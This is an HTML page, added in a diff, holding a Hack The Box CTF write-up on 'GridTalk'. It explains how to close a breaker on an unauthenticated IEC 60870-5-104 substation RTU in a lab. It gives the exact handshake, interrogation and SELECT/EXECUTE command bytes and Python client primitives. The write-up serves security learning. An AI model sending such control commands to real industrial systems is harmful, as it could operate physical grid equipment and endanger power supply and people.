@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>GridTalk — HTB Writeup · Arthur Trapp</title>
+<meta name="description" content="IEC 60870-5-104 — close a substation breaker to trigger the M_BO_NA_1 diagnostic" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%232c3b4d'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+<header>
+  <div class="wrap nav">
+    <a class="nav-brand" href="../index.html"><span class="logo">AT</span>arthur_trapp</a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#projects">projects</a>
+      <a class="active" href="index.html">writeups</a>
+      <a href="../index.html#contact">contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="page-hero">
+    <div class="wrap">
+      <div class="crumb"><a href="../index.html">~</a> / <a href="index.html">writeups</a> / gridtalk</div>
+      <h1>GridTalk</h1>
+      <p class="sub">Hack The Box · <span class="accent">Hard</span> · ICS / SCADA</p>
+      <div class="meta-tags">
+        <span class="red">Hard</span>
+        <span>ICS / SCADA</span>
+        <span class="accent">Challenge</span>
+      </div>
+    </div>
+  </div>
+  <article class="content wrap">
+<p><strong>Category:</strong> ICS/SCADA · IEC 60870-5-104
+<strong>Difficulty:</strong> Hard
+<strong>Result:</strong> ✅ Solved — audit ticket recovered</p>
+<hr />
+<h2>1. Challenge Overview</h2>
+<blockquote>
+<p><em>"Aurora Junction substation speaks IEC 60870-5-104 on TCP/2404 — no auth. A no-load audit test breaker on IOA 1003 is wired to a diagnostic dump; close it and the RTU emits an M_BO_NA_1 ASDU whose bytes decode to the audit ticket."</em></p>
+</blockquote>
+<p><strong>Targets</strong></p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Role</th>
+<th>Address (initial)</th>
+<th>Address (after restart)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IEC-104 RTU</td>
+<td><code>154.57.164.66:44055</code></td>
+<td><code>154.57.164.66:36176</code></td>
+</tr>
+<tr>
+<td>Flask HMI</td>
+<td><code>154.57.164.66:39784</code></td>
+<td><code>154.57.164.66:31323</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>The scenario was distributed as a password-protected <code>GridTalk.zip</code>; extracting its <code>NOTE.md</code> confirmed the two hosts and the objective.</p>
+<hr />
+<h2>2. Reconnaissance</h2>
+<h3>2.1 Service identification</h3>
+<pre><code>36176 → raw TCP, no HTTP banner (curl: &quot;Empty reply from server&quot;)   → IEC-104 RTU
+31323 → HTTP/1.1 200, Server: Werkzeug/3.1.8 Python/3.11.15         → Flask HMI
+</code></pre>
+<h3>2.2 HMI enumeration</h3>
+<p><code>GET /api/state</code> (the only endpoint in the HMI's JS) returned:</p>
+<pre><code class="language-json">{
+  &quot;breakers&quot;: {
+    &quot;1001&quot;: {&quot;name&quot;: &quot;BAY-1 IN-FEED&quot;,    &quot;state&quot;: true},
+    &quot;1002&quot;: {&quot;name&quot;: &quot;BAY-2 OUT-FEED&quot;,   &quot;state&quot;: true},
+    &quot;1003&quot;: {&quot;name&quot;: &quot;AUDIT-TEST-1&quot;,     &quot;state&quot;: false},   ← target, OPEN
+    &quot;1004&quot;: {&quot;name&quot;: &quot;BAY-3 TX-COUPLER&quot;, &quot;state&quot;: true},
+    &quot;1005&quot;: {&quot;name&quot;: &quot;BAY-4 BUSTIE&quot;,     &quot;state&quot;: true}
+  },
+  &quot;connected&quot;: true
+}
+</code></pre>
+<p>This leaked the <strong>common address = 2000</strong> and the target breaker <strong>IOA = 1003</strong>.</p>
+<h3>2.3 Tooling gap</h3>
+<p>No <code>sshpass</code>, <code>pexpect</code>, <code>scapy</code> IEC-104 layer, or any <code>iec104</code> Python module was available — the <strong>entire IEC 60870-5-104 protocol had to be implemented over a raw TCP socket</strong> (APCI framing + ASDU encoding) in Python.</p>
+<hr />
+<h2>3. Protocol Analysis (IEC 60870-5-104)</h2>
+<h3>3.1 Frame format (APCI)</h3>
+<pre><code> 0x68 | LEN | 4-byte control field | ASDU ...
+</code></pre>
+<ul>
+<li><strong>U-frames</strong> (control): STARTDT_ACT = <code>0x07</code>, STARTDT_CON = <code>0x0b</code></li>
+<li><strong>I-frames</strong>: carry <code>N(S)</code> (send seq) and <code>N(R)</code> (receive seq):</li>
+<li><code>N(S) = (ctrl[0]&gt;&gt;1) | (ctrl[1]&lt;&lt;7)</code></li>
+<li><code>N(R) = (ctrl[2]&gt;&gt;1) | (ctrl[3]&lt;&lt;7)</code></li>
+</ul>
+<h3>3.2 ASDU types used</h3>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Type ID</th>
+<th>Name</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1</code></td>
+<td><code>M_SP_NA_1</code></td>
+<td>single-point (breaker state) telemetry</td>
+</tr>
+<tr>
+<td><code>7</code></td>
+<td><code>M_BO_NA_1</code></td>
+<td>32-bit bitstring — <strong>the diagnostic</strong></td>
+</tr>
+<tr>
+<td><code>11</code></td>
+<td><code>M_ME_NB_1</code></td>
+<td>scaled measured values</td>
+</tr>
+<tr>
+<td><code>45</code></td>
+<td><code>C_SC_NA_1</code></td>
+<td>single command (close/open breaker)</td>
+</tr>
+<tr>
+<td><code>100</code></td>
+<td><code>C_IC_NA_1</code></td>
+<td>general interrogation</td>
+</tr>
+</tbody>
+</table></div>
+<h3>3.3 Cause-of-transmission (COT)</h3>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>COT</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>3</code></td>
+<td>spontaneous (unsolicited)</td>
+</tr>
+<tr>
+<td><code>6</code></td>
+<td>activation (our request)</td>
+</tr>
+<tr>
+<td><code>7</code></td>
+<td>activation confirmation</td>
+</tr>
+<tr>
+<td><code>10</code></td>
+<td>activation termination</td>
+</tr>
+<tr>
+<td><code>20</code></td>
+<td>interrogation response</td>
+</tr>
+</tbody>
+</table></div>
+<h3>3.4 Command value (SCS) for <code>C_SC_NA_1</code></h3>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>bit</th>
+<th>meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bit 7 (0x80)</td>
+<td>SE — <strong>select</strong> (1) vs <strong>execute</strong> (0)</td>
+</tr>
+<tr>
+<td>bit 0 (0x01)</td>
+<td>ON/close (1) vs OFF/open (0)</td>
+</tr>
+</tbody>
+</table></div>
+<p>So: <strong>SELECT close = <code>0x81</code></strong>, <strong>EXECUTE close = <code>0x01</code></strong>.</p>
+<hr />
+<h2>4. Exploitation</h2>
+<h3>4.1 The full wire sequence (verified on fresh instance)</h3>
+<pre><code>1. STARTDT_ACT       68 04 07 00 00 00
+   ← STARTDT_CON     68 04 0b 00 00 00
+
+2. Interrogation     C_IC_NA_1  (QOI=20)  → enumerate telemetry
+   ← M_SP_NA_1       breakers 1001–1005  (1003 = 0 / OPEN)
+   ← M_ME_NB_1       measurements 2001–2004
+   ← C_IC_NA_1       cot=10 (termination)
+
+3. SELECT close      C_SC_NA_1  ASDU = 2d 01 06 00 d0 07 eb 03 00 81
+   ← cot=7  (SCS=0x81)
+   ← cot=10 (select terminated)
+
+4. EXECUTE close     C_SC_NA_1  ASDU = 2d 01 06 00 d0 07 eb 03 00 01
+   ← cot=7  (SCS=0x01)
+   ← M_SP_NA_1  cot=3  ioa=1003 state=1   ← breaker CLOSED
+   ← cot=10 (execute terminated)
+   ← M_BO_NA_1  cot=3                     ← ★ THE DIAGNOSTIC ★
+</code></pre>
+<h3>4.2 The diagnostic frame (decoded)</h3>
+<pre><code>68 35                         start + LEN=0x35 (53)
+12 00 06 00                   control: N(S)=9, N(R)=3
+07                            type = 7  (M_BO_NA_1)
+88                            VSQ: SQ=1 (sequential), n=8
+03 00                         COT = 3 (spontaneous)
+d0 07                         CA = 2000
+89 13 00                      IOA = 5001
+[REDACTED]
+                              ^^^ 40-byte bitstring payload (with NUL padding)
+</code></pre>
+<h3>4.3 Decode the ticket</h3>
+<p>The 40-byte payload is the flag with a <code>0x00</code> NUL interleaved every 5th byte:</p>
+<pre><code>[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+[REDACTED]
+</code></pre>
+<p>Strip the NULs:</p>
+<pre><code>[REDACTED]
+</code></pre>
+<hr />
+<h2>5. Flag</h2>
+<pre><code>[REDACTED]
+</code></pre>
+<p>(<em>"breaker flipped via IEC 104"</em> — a perfect summary of the attack.)</p>
+<hr />
+<h2>6. Step-by-Step Walkthrough</h2>
+<h3>Step 1 — Identify the services</h3>
+<pre><code class="language-bash">curl -sS -m 8 -o /dev/null -w &quot;%{http_code} %header{server}\n&quot; http://154.57.164.66:36176/
+# → 000  (raw TCP = IEC-104 RTU)
+
+curl -sS -m 8 -o /dev/null -w &quot;%{http_code} %header{server}\n&quot; http://154.57.164.66:31323/
+# → 200  Werkzeug/3.1.8 Python/3.11.15  (Flask HMI)
+</code></pre>
+<h3>Step 2 — Read the HMI state</h3>
+<pre><code class="language-bash">curl -sS http://154.57.164.66:31323/api/state
+# → breakers 1001-1005; AUDIT-TEST-1 (1003) = false (OPEN)
+</code></pre>
+<h3>Step 3 — Implement IEC-104 client (Python)</h3>
+<p>Core primitives (full script in <code>iec104_final.py</code>):</p>
+<pre><code class="language-python">def ifr(ns, nr, asdu):
+    ctrl = bytes([(ns&lt;&lt;1)&amp;0xFE, (ns&gt;&gt;7)&amp;0xFF, (nr&lt;&lt;1)&amp;0xFE, (nr&gt;&gt;7)&amp;0xFF])
+    return bytes([0x68, 4+len(asdu)]) + ctrl + asdu
+
+def csc(scs):  # C_SC_NA_1
+    return bytes([0x2D, 1, 6, 0, CA&amp;0xFF, (CA&gt;&gt;8)&amp;0xFF,
+                  IOA&amp;0xFF, (IOA&gt;&gt;8)&amp;0xFF, (IOA&gt;&gt;16)&amp;0xFF, scs])
+
+def cic(qoi=20):  # C_IC_NA_1
+    return bytes([0x64, 1, 6, 0, CA&amp;0xFF, (CA&gt;&gt;8)&amp;0xFF, qoi])
+</code></pre>
+<h3>Step 4 — Handshake, interrogate, close the breaker</h3>
+<pre><code class="language-python"># STARTDT
+sock.sendall(b&quot;\x68\x04\x07\x00\x00\x00&quot;)
+
+# enumerate (optional, confirms breaker state)
+sock.sendall(ifr(ns, nr, cic(20)))
+
+# SELECT close  → wait for cot=7
+sock.sendall(ifr(ns, nr, csc(0x81)))
+
+# EXECUTE close → wait for the M_BO_NA_1 diagnostic
+sock.sendall(ifr(ns, nr, csc(0x01)))
+</code></pre>
+<h3>Step 5 — Parse &amp; decode the diagnostic</h3>
+<p>For every <code>M_BO_NA_1</code> (type 7) frame, read the ASDU <strong>info field</strong> (IOA + 4-byte bitstring chunks), concatenate all chunks, strip <code>0x00</code>, and print.</p>
+<hr />
+<h2>7. Key Techniques &amp; Pitfalls</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>Technique / Pitfall</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong><code>N(R)</code> receive-sequence tracking</strong> — you MUST echo the peer's <code>N(S)+1</code> in every frame you send. A stale <code>N(R)</code> makes the RTU <strong>silently ignore</strong> your command.</td>
+<td>Cost 3 iterations (v3→v6)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong><code>M_BO_NA_1</code> sequential (SQ=1) addressing</strong> — only the <em>first</em> object carries an IOA; the rest are bare 4-byte bitstrings.</td>
+<td>Would mis-decode the ticket</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>One-time canary diagnostic</strong> — the ticket is emitted <em>exactly once</em> per instance, on the first breaker close. No reset endpoint, no reset-process command, no interrogation group recovers it.</td>
+<td>Required a full instance restart</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>Buffered reader truncation</strong> — <code>sock.recv(n)</code> can return fewer than <code>n</code> bytes; a naive reader truncated the 55-byte diagnostic frame.</td>
+<td>Missed the flag on attempt #1</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>VSQ <code>n</code> vs actual byte count</strong> — the VSQ declared <code>n=8</code> but the frame carried 10 chunks; trust the frame length field, not <code>n</code>.</td>
+<td>Avoided truncating the ticket</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2>8. Artifacts</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>File</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>iec104_final.py</code></td>
+<td>Final working IEC-104 client (handshake → interrogate → close → decode)</td>
+</tr>
+<tr>
+<td><code>NOTE.md</code></td>
+<td>Extracted scenario note (objective + hosts)</td>
+</tr>
+<tr>
+<td><code>hmi.html</code></td>
+<td>HMI index (revealed <code>/api/state</code>)</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2>9. Flag (final)</h2>
+<pre><code>[REDACTED]
+</code></pre>
+    <a class="back-link" href="index.html">← all writeups</a>
+  </article>
+</main>
+<footer>
+  <div class="wrap footer-row">
+    <span>© 2026 Arthur Trapp · Rochester, NY</span>
+    <span class="clearance">ACTIVE TS/SCI CLEARANCE</span>
+  </div>
+</footer>
+<script>
+  const io = new IntersectionObserver((es) => {
+    es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.content h2, .content h3, .content p, .content pre, .content table, .content ul, .content ol, .content blockquote').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
